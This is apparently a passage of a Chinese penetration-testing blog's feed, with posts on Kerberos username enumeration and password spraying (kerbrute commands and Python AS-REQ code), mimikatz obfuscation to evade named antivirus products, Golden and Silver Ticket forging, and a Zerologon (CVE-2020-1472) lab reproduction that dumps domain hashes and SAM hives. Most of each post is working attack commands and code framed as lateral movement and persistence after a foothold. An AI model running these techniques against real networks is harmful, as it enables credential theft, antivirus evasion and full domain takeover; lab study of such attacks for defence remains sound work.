        &lt;h1 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/pre
      
    
    </summary>
    
    
    
      <category term="环境搭建" scheme="http://sherlocz.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>基于kerberos协议的域内用户名密码爆破</title>
    <link href="http://sherlocz.github.io/2020/10/26/kerberos-brute/"/>
    <id>http://sherlocz.github.io/2020/10/26/kerberos-brute/</id>
    <published>2020-10-26T06:41:54.000Z</published>
    <updated>2020-10-26T08:40:38.415Z</updated>
    
    <content type="html"><![CDATA[<p>拿到域内机器之后，我们需要横向移动，域内用户账号密码的收集和爆破也是很重要的。</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>domain:hacke.testlab(192.168.43.100)<br>win2008:192.168.43.110</p><h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p><img src="/2020/10/26/kerberos-brute/kerberos.png" alt><br>一般情况下我们的KDC就是DC</p><h1 id="域用户爆破"><a href="#域用户爆破" class="headerlink" title="域用户爆破"></a>域用户爆破</h1><h2 id="kerbrute"><a href="#kerbrute" class="headerlink" title="kerbrute"></a>kerbrute</h2><p>基于golang编写的一款爆破工具，支持域内用户名枚举、密码爆破，支持win/linux。</p><p>github:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ropnop/kerbrute.git</span><br></pre></td></tr></table></figure></p><p>下载好之后用golang进行编译<br><img src="/2020/10/26/kerberos-brute/gobuild.png" alt></p><p>会生成<strong>kerbrute.exe</strong></p><p>放到域内机器执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#用户名枚举</span><br><span class="line">kerbrute.exe userenum -d dc.local username.txt</span><br><span class="line">#密码喷洒</span><br><span class="line">kerbrute.exe passwordspray -d dc.local username.txt password</span><br></pre></td></tr></table></figure></p><p>效果如下：</p><p><img src="/2020/10/26/kerberos-brute/enum.png" alt><br><img src="/2020/10/26/kerberos-brute/passwordspray.png" alt></p><h2 id="pykerbrute"><a href="#pykerbrute" class="headerlink" title="pykerbrute"></a>pykerbrute</h2><p>三好学生编写的py脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#用户名枚举</span><br><span class="line">EnumADUser.py &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;mode&gt;</span><br><span class="line">&lt;mode&gt;: tcp or udp</span><br><span class="line">#密码喷洒</span><br><span class="line">ADPwdSpray.py &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;file&gt; &lt;passwordtype&gt; &lt;data&gt; &lt;mode&gt;</span><br><span class="line">&lt;mode&gt;: tcp or udp</span><br></pre></td></tr></table></figure></p><p>效果如下：</p><p><img src="/2020/10/26/kerberos-brute/py.png" alt><br><img src="/2020/10/26/kerberos-brute/py.png" alt></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>其实就是发送认证的包，抓取返回值(原理文章后面有写)<br>这里看EnumADUser.py<br>AS-REQ结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">def build_req_body(realm, service, host, nonce, cname=None):</span><br><span class="line"> </span><br><span class="line">    req_body = KdcReqBody()</span><br><span class="line"></span><br><span class="line">    # (Forwardable, Proxiable, Renewable, Canonicalize)</span><br><span class="line">#   req_body[&apos;kdc-options&apos;] = &quot;&apos;01010000100000000000000000000000&apos;B&quot;</span><br><span class="line">    req_body[&apos;kdc-options&apos;] = &quot;&apos;00000000000000000000000000010000&apos;B&quot;</span><br><span class="line">    if cname is not None:</span><br><span class="line">        req_body[&apos;cname&apos;] = None</span><br><span class="line">        req_body[&apos;cname&apos;]</span><br><span class="line">        req_body[&apos;cname&apos;][&apos;name-type&apos;] = NT_PRINCIPAL</span><br><span class="line">        req_body[&apos;cname&apos;][&apos;name-string&apos;] = None</span><br><span class="line">        req_body[&apos;cname&apos;][&apos;name-string&apos;][0] = cname</span><br><span class="line"></span><br><span class="line">    req_body[&apos;realm&apos;] = realm</span><br><span class="line"></span><br><span class="line">    req_body[&apos;sname&apos;] = None</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-type&apos;] = NT_SRV_INST</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-string&apos;] = None</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-string&apos;][0] = service</span><br><span class="line">    req_body[&apos;sname&apos;][&apos;name-string&apos;][1] = host</span><br><span class="line"></span><br><span class="line">    req_body[&apos;till&apos;] = &apos;19700101000000Z&apos;</span><br><span class="line">    </span><br><span class="line">    req_body[&apos;nonce&apos;] = nonce</span><br><span class="line"></span><br><span class="line">    req_body[&apos;etype&apos;] = None</span><br><span class="line">    req_body[&apos;etype&apos;][0] = RC4_HMAC</span><br><span class="line">    </span><br><span class="line">    return req_body</span><br></pre></td></tr></table></figure></p><p>进行封装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def build_as_req(target_realm, user_name, nonce):</span><br><span class="line">    req_body = build_req_body(target_realm, &apos;krbtgt&apos;, target_realm, nonce, cname=user_name)</span><br><span class="line"></span><br><span class="line">    as_req = AsReq()</span><br><span class="line"></span><br><span class="line">    as_req[&apos;pvno&apos;] = 5</span><br><span class="line">    as_req[&apos;msg-type&apos;] = 10</span><br><span class="line"></span><br><span class="line">    as_req[&apos;padata&apos;] = None</span><br><span class="line"></span><br><span class="line">    as_req[&apos;req-body&apos;] = _v(4, req_body)</span><br><span class="line">    print(as_req)</span><br><span class="line"></span><br><span class="line">    return as_req</span><br></pre></td></tr></table></figure></p><p>发送请求tcp/udp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def send_req_tcp(req, kdc, port=88):</span><br><span class="line">    data = encode(req)</span><br><span class="line">    data = pack(&apos;&gt;I&apos;, len(data)) + data</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((kdc, port))</span><br><span class="line">    sock.send(data)</span><br><span class="line">    return sock</span><br><span class="line"></span><br><span class="line">def send_req_udp(req, kdc, port=88):</span><br><span class="line">    data = encode(req)</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    sock.connect((kdc, port))</span><br><span class="line">    sock.send(data)</span><br><span class="line">    return sock</span><br></pre></td></tr></table></figure></p><p>接收请求tcp/udp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def recv_rep_tcp(sock):</span><br><span class="line">    data = &apos;&apos;</span><br><span class="line">    datalen = None</span><br><span class="line">    while True:</span><br><span class="line">        rep = sock.recv(8192)</span><br><span class="line">        if not rep:</span><br><span class="line">            sock.close()</span><br><span class="line">            raise IOError(&apos;Connection error&apos;)</span><br><span class="line">        data += rep</span><br><span class="line">        if len(rep) &gt;= 4:</span><br><span class="line">            if datalen is None:</span><br><span class="line">                datalen = unpack(&apos;&gt;I&apos;, rep[:4])[0]</span><br><span class="line">            if len(data) &gt;= 4 + datalen:</span><br><span class="line">                sock.close()</span><br><span class="line">                return data[4:4 + datalen]</span><br><span class="line"></span><br><span class="line">def recv_rep_udp(sock):</span><br><span class="line">    data = &apos;&apos;</span><br><span class="line">    datalen = None</span><br><span class="line">    while True:</span><br><span class="line">        rep = sock.recv(8192)</span><br><span class="line">        if not rep:</span><br><span class="line">            sock.close()</span><br><span class="line">            raise IOError(&apos;Connection error&apos;)</span><br><span class="line">        data += rep</span><br><span class="line">        if len(rep) &gt;= 4:</span><br><span class="line">            sock.close()</span><br><span class="line">            return data</span><br></pre></td></tr></table></figure></p><p>验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def checkuser_tcp(user_realm, user_name, kdc_a):</span><br><span class="line">     </span><br><span class="line">    nonce = getrandbits(31)  </span><br><span class="line">    as_req = build_as_req(user_realm, user_name, nonce)</span><br><span class="line">    sock = send_req_tcp(as_req, kdc_a)</span><br><span class="line">    data = recv_rep_tcp(sock)</span><br><span class="line">    i=0</span><br><span class="line">    for c in data:       </span><br><span class="line">        i=i+1</span><br><span class="line">        if(i==47):</span><br><span class="line">            if(ord(c)==0x19):</span><br><span class="line">                print(&apos;[+] Valid user: %s&apos;%(user_name))</span><br><span class="line"></span><br><span class="line">def checkuser_udp(user_realm, user_name, kdc_a):</span><br><span class="line">     </span><br><span class="line">    nonce = getrandbits(31)  </span><br><span class="line">    as_req = build_as_req(user_realm, user_name, nonce)</span><br><span class="line">    sock = send_req_udp(as_req, kdc_a)</span><br><span class="line">    data = recv_rep_udp(sock)</span><br><span class="line">    i=0</span><br><span class="line">    for c in data:       </span><br><span class="line">        i=i+1</span><br><span class="line">        if(i==47):</span><br><span class="line">            if(ord(c)==0x19):</span><br><span class="line">                print(&apos;[+] Valid user: %s&apos;%(user_name))</span><br></pre></td></tr></table></figure></p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>使用win2008登陆域用户，会向我们的域控发起认证请求</p><h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>在认证过程中，若用户名不存在，AS-REQ请求会返回对应的错误信息<br><img src="/2020/10/26/kerberos-brute/unknownuser2.png" alt><br><img src="/2020/10/26/kerberos-brute/unknownuser.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户不存在：</span><br><span class="line">error_code:eRR-C-PRINCIPALL-UNKNOWN</span><br><span class="line">用户存在：</span><br><span class="line">error_code:eRR-PREAUTH-REQUIRED</span><br></pre></td></tr></table></figure><h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>在认证过程中，若密码错误，AS-REQ请求会返回对应的错误信息<br><img src="/2020/10/26/kerberos-brute/passwordrequire.png" alt><br><img src="/2020/10/26/kerberos-brute/passwordrequire2.png" alt><br>特征：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_code:eRR-PREAUTH-FAILED</span><br></pre></td></tr></table></figure></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/8187" title="https://xz.aliyun.com/t/8187" target="_blank" rel="noopener">内网渗透之kerberos协议分析</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483670&amp;idx=1&amp;sn=1063bf299a8894f87521e8d73a687ff3&amp;chksm=eaa5bb36ddd2322086fc0218a8d21c9d5602dff7aee67f065040b80e8d6bb676d8dbfa09f8ff&amp;mpshare=1&amp;scene=1&amp;srcid=10264x2ShzrGPOXac4PWw5Gk&amp;sharer_sharetime=1603698453434&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=de879d1d09e2a8b778841b0be47afa29672479cb903399099f08479ef0dda0812b37579c0417dac7f3758adc60e53ea6f07d2d067b7cbe6b183ac35b394c2bfdcd1cd7e8f9fff19ba08344491cfefa1a3f14d75b4c9e2278e48a036f130c4b72a8c128393147e5bcd2b1db960d590e9188ecfaeb289d570f85910170e5627a28&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=6300002f&amp;lang=zh_CN&amp;exportkey=AwKZNFdw%2FNyuZo%2BMpedulXU%3D&amp;pass_ticket=aMSAguw%2B9AAx19KRHCD36hX7xx3it%2B1gt3T%2BbrbyfO97iXDUbUjaF4%2B8IcOAAkny&amp;wx_header=0" title="https://mp.weixin.qq.com/s?__biz=MzI2NDk0MTM5MQ==&amp;mid=2247483670&amp;idx=1&amp;sn=1063bf299a8894f87521e8d73a687ff3&amp;chksm=eaa5bb36ddd2322086fc0218a8d21c9d5602dff7aee67f065040b80e8d6bb676d8dbfa09f8ff&amp;mpshare=1&amp;scene=1&amp;srcid=10264x2ShzrGPOXac4PWw5Gk&amp;sharer_sharetime=1603698453434&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=de879d1d09e2a8b778841b0be47afa29672479cb903399099f08479ef0dda0812b37579c0417dac7f3758adc60e53ea6f07d2d067b7cbe6b183ac35b394c2bfdcd1cd7e8f9fff19ba08344491cfefa1a3f14d75b4c9e2278e48a036f130c4b72a8c128393147e5bcd2b1db960d590e9188ecfaeb289d570f85910170e5627a28&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=6300002f&amp;lang=zh_CN&amp;exportkey=AwKZNFdw%2FNyuZo%2BMpedulXU%3D&amp;pass_ticket=aMSAguw%2B9AAx19KRHCD36hX7xx3it%2B1gt3T%2BbrbyfO97iXDUbUjaF4%2B8IcOAAkny&amp;wx_header=0" target="_blank" rel="noopener">这是一篇“不一样”的真实渗透测试案例分析文章</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;拿到域内机器之后，我们需要横向移动，域内用户账号密码的收集和爆破也是很重要的。&lt;/p&gt;
&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;domain:hacke.testlab(19
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>mimikatz简单免杀</title>
    <link href="http://sherlocz.github.io/2020/10/10/Obfuscate-Mimikatz/"/>
    <id>http://sherlocz.github.io/2020/10/10/Obfuscate-Mimikatz/</id>
    <published>2020-10-10T04:43:43.000Z</published>
    <updated>2020-10-10T07:44:27.765Z</updated>
    
    <content type="html"><![CDATA[<p>传送门：<a href="https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/" title="https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/">【原版mimikatz编译】</a></p><h1 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h1><p><a href="https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh" title="https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh" target="_blank" rel="noopener">https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh</a></p><p><a href="https://github.com/upx/upx" title="https://github.com/upx/upx" target="_blank" rel="noopener">https://github.com/upx/upx</a><br>混淆-&gt;upx加壳</p><p>卡巴的每次都要重新编译，upx加壳</p><p><img src="/2020/10/10/Obfuscate-Mimikatz/kabasiji.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/360.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/huorong.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/symantec.png" alt></p><p>upx过后的大小在800kb左右</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;传送门：&lt;a href=&quot;https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/&quot; title=&quot;https://sherlocz.github.io/2020/05/20/mimikatz%E7%
      
    
    </summary>
    
    
    
      <category term="免杀" scheme="http://sherlocz.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>kerberos协议中的票据传递攻击</title>
    <link href="http://sherlocz.github.io/2020/09/20/kerberos-PtT/"/>
    <id>http://sherlocz.github.io/2020/09/20/kerberos-PtT/</id>
    <published>2020-09-19T16:08:10.000Z</published>
    <updated>2021-02-19T03:30:40.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PtT"><a href="#PtT" class="headerlink" title="PtT"></a>PtT</h1><p>Pass the Ticket，基于Kerberos协议进行攻击，通常是用来做<strong>权限维持</strong></p><h1 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>client端在和KDC进行认证的过程中，TGT是由域内krbtgt用户hash计算生成，所以当我们得到了域内krbtgt用户的NTLM 哈希或AES-256的值，可以将权限伪装成任意域内用户(包括域管用户)。</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞前提：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.要伪装的域内用户名</span><br><span class="line">2.krbtgt用户hash</span><br><span class="line">3.krbtgt用户sid</span><br><span class="line">4.域名</span><br></pre></td></tr></table></figure></p><p>利用mimikatz可以进行伪造</p><p>首先我们要知道krbtgt的相关信息，在域控制器中执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /user:krbtgt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/1.png" alt></p><p>获取到sid(sid去除id后面的502)和ntlm hash如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sid:S-1-5-21-306775267-2343279330-10040798</span><br><span class="line">hash:8fe2af5ffd00a2b58a9a42c8c95ee373</span><br></pre></td></tr></table></figure></p><p>接下来在域内一台机器上生成Golden Ticket：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:hacke\administrator /domain:hacke.testlab/sid:S-1-5-21-306775267-2343279330-10040798 /krbtgt:8fe2af5ffd00a2b58a9a42c8c95ee373 /ptt  </span><br><span class="line"></span><br><span class="line">kerberos::ptt C:\Users\oreo\Desktop\ticket.kirbi #导入票据</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/2.png" alt></p><p>成功导入，可以利用cmd下的klist命令查看导入的票据。</p><p>这里导入票据之后，我们可以看下是否能够伪造身份：</p><p><img src="/2020/09/20/kerberos-PtT/3.png" alt></p><p>dir 域控的目录，能够成功访问，说明票据成功</p><h1 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h1><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>伪造ST服务票据，不需要和KDC进行交互，动静较小</p><h2 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞前提：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.伪造的用户名</span><br><span class="line">2.服务用户hash(dc$账号的hash)</span><br><span class="line">3.用户sid</span><br></pre></td></tr></table></figure></p><p>首先我们用mimikatz来读取计算机的hash<br><img src="/2020/09/20/kerberos-PtT/4.png" alt></p><p>获取sid<br><img src="/2020/09/20/kerberos-PtT/5.png" alt><br>在域内任意一台机器上制作Silver Ticket<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:hacke.testlab /sid:S-1-5-21-306775267-2343279330-10040798 /target:dc.hacke.testlab /service:cifs /rc4:&#123;ntlm hash&#125; /user:administrator /ptt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/6.png" alt></p><p>再次访问dc的c$<br><img src="/2020/09/20/kerberos-PtT/3.png" alt></p><h1 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h1><p>当我们使用票据成功后，后续可使用psexec.exe与目标机器进行交互cmd shell</p><p><a href="https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe" target="_blank" rel="noopener">https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</a></p><p>不过这两个都是属于后门维持的攻击，还是MS14-068好用啊</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PtT&quot;&gt;&lt;a href=&quot;#PtT&quot; class=&quot;headerlink&quot; title=&quot;PtT&quot;&gt;&lt;/a&gt;PtT&lt;/h1&gt;&lt;p&gt;Pass the Ticket，基于Kerberos协议进行攻击，通常是用来做&lt;strong&gt;权限维持&lt;/strong&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1472(域内提权)漏洞复现</title>
    <link href="http://sherlocz.github.io/2020/09/16/CVE-2020-1472/"/>
    <id>http://sherlocz.github.io/2020/09/16/CVE-2020-1472/</id>
    <published>2020-09-16T08:41:58.000Z</published>
    <updated>2020-09-17T16:49:43.062Z</updated>
    
    <content type="html"><![CDATA[<p>2020年9月16日 星期二  阴</p><p>深夜难眠，回想起今天waf上一大堆误报和寥寥无几的告警，甲方爸爸提供的两荤一素已经换成了白粥榨菜，农夫已经换成了怡宝，猪肉换成了榨菜，或许我们是时长一个月实习生的身份，已经彻底暴露了，明天不知道是不是只能吃开水泡面了。唉，明天又要穿上白衬衫，继续假装自己是5年工作经验的安全专家，今晚终于认清现实，活捉红队0day依然是我们遥不可及的梦。</p><p>生而为人，谁都是第一次。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://sherlocz.github.io/2020/01/31/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="https://sherlocz.github.io/2020/01/31/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">简单的域环境搭建</a></p><p>发现环境还有，稍微改了一下：</p><ul><li>Domain:hacke</li><li>Windows server 2012(DC) 192.168.43.100</li><li>Windows server 2008    192.168.43.101</li><li>Windows7    192.168.43.102</li><li>Kali(攻击机器)    192.168.43.105</li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>利用过程：将域控密码设置为空-&gt;读取hash-&gt;读取sam文件hash(ntds.dit)-&gt;恢复域控密码</p><p>要安装impacket:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">cd impacket</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure></p><p>下载我们的poc(下文有下载连接)<br>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &#123;computer name&#125; &#123;ip&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/16/CVE-2020-1472/1.png" alt></p><p>执行成功之后，密码就会修改为空(修改的是域控的机器密码，不是域控的密码)，接下来用impacket中的/impacket/examples/secretsdump.py来读取域控中的hash</p><p><img src="/2020/09/16/CVE-2020-1472/2.png" alt></p><p>当我们获取了hash之后(这里应该是域管的)，我们可以读取域控制器中sam文件的hash，用来获取之前机器的原始密码(<a href="读取SAM和SYSTEM文件中的NTLM-HASH" title="https://sherlocz.github.io/2020/02/02/%E4%BD%BF%E7%94%A8Mimikatz%E8%AF%BB%E5%8F%96SAM%E5%92%8CSYSTEM%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84NTLM-HASH/">读取SAM和SYSTEM文件中的NTLM-HASH</a>)</p><p>通过wmiexec执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ython3 wmiexec.py -hashes xxxxxx hacke/Administrator@192.168.43.100</span><br></pre></td></tr></table></figure></p><p>然后将三个文件搞下来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line">reg save hklm\security security.hive</span><br><span class="line"></span><br><span class="line">get sam.hive</span><br><span class="line">get system.hive</span><br><span class="line">get security.hive</span><br></pre></td></tr></table></figure></p><p>读取sam里面的hash：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.hive -security security.hive -system system.hive  LOCAL</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/16/CVE-2020-1472/4.png" alt><br>居然吧我之前修改过的历史密码也读取出来了，也不知道为啥 == </p><p>最后，利用脚本传入hash，恢复之前的密码<br><img src="/2020/09/16/CVE-2020-1472/5.png" alt></p><p>再来检查密码是否正确(之前修改后密码为空)<br><img src="/2020/09/16/CVE-2020-1472/6.png" alt></p><p><img src="/2020/09/16/CVE-2020-1472/7.png" alt></p><h1 id="Poc-Exp"><a href="#Poc-Exp" class="headerlink" title="Poc/Exp"></a>Poc/Exp</h1><p><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/risksense/zerologon" target="_blank" rel="noopener">https://github.com/risksense/zerologon</a></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p><a 